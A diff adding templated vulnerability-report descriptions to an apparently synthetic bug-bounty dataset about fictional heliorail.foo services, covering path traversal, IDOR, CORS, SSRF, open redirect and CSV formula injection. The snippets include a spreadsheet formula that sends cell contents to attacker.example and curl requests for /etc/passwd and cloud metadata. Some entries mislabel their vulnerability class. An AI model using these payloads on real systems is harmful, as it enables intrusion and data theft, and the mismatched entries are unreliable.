+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19226,7 +19371,8 @@
           "offset": "2d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19333,7 +19479,8 @@
           "offset": "4d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.heliorail.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19501,7 +19648,8 @@
           "offset": "6d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/profile`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19644,7 +19792,8 @@
           "offset": "17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.heliorail.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19783,7 +19932,8 @@
           "offset": "2d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19899,7 +20049,8 @@
           "offset": "5d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20027,7 +20178,8 @@
           "offset": "5d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20159,7 +20311,8 @@
           "offset": "6d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20265,7 +20418,8 @@
           "offset": "3d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20439,7 +20593,8 @@
           "offset": "7d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20521,7 +20676,8 @@
           "offset": "2d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20647,7 +20803,8 @@
           "offset": "7d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20765,7 +20922,8 @@
           "offset": "3d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20889,7 +21047,8 @@
           "offset": "3d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21038,7 +21197,8 @@
           "offset": "8d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21169,7 +21329,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21276,7 +21437,8 @@
           "offset": "3d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21439,7 +21601,8 @@
           "offset": "7d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21558,7 +21721,8 @@
           "offset": "7d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21693,7 +21857,8 @@
           "offset": "2d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.heliorail.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21813,7 +21978,8 @@
           "offset": "2d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21956,7 +22122,8 @@
           "offset": "8d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22092,7 +22259,8 @@
           "offset": "7d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22245,7 +22413,8 @@
           "offset": "9d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22411,7 +22580,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22551,7 +22721,8 @@
           "offset": "3d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22691,7 +22862,8 @@
           "offset": "3d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22820,7 +22992,8 @@
           "offset": "5d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22960,7 +23133,8 @@
           "offset": "4d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23074,7 +23248,8 @@
           "offset": "1d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23185,7 +23360,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23317,7 +23493,8 @@
           "offset": "1d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
